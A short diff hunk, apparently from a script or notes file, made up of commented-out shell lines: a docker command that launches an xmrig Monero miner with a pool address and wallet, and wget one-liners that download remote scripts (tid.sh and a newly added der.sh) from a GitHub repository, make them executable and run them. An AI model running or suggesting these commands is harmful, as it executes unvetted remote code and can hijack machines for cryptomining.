@@ -7,3 +7,5 @@
 # docker run --restart=always miningcontainers/xmrig:latest --tls -o xmr-us-east1.nanopool.org:14433 -u 83ErkzmC8yH2omjYvg6G7vc4fiP33k9EsXrGjs4ssW7hetWN3VHKgtVDsGTpjipJmDMWnsgpfb32NYw186uYE2UyEcDv343 --coin monero
 
 # wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/tid.sh && chmod +x tid.sh && ./tid.sh
+
+# wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/der.sh && chmod +x der.sh && ./der.sh
